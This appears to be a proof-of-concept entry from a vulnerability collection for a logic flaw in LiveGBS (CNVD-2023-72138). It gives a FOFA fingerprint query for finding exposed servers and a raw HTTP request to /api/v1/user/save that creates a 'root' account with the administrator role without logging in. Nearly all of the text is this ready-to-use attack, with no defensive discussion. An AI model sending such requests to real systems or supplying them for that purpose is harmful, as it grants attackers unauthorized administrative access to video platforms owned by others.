## LiveGBS存在逻辑缺陷漏洞(CNVD-2023-72138)

## fofa
```
icon_hash="-206100324"
```


## poc
```
GET /api/v1/user/save?ID=&Username=root&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Connection: close

```

![image](https://github.com/wy876/POC/assets/139549762/c77b5b4e-f3c0-4653-82a6-ebd9756f431e)
